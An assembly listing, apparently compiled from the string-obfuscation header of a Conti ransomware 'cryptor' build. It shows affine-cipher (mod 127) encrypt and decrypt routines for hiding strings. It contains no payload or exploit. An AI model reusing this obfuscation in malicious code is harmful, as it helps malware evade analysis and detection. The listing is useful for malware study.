; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 73	 sub	 eax, 115		; 00000073H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 73	 add	 r8d, 115		; 00000073H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 24 00 00 00	 mov	 ecx, 36			; 00000024H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
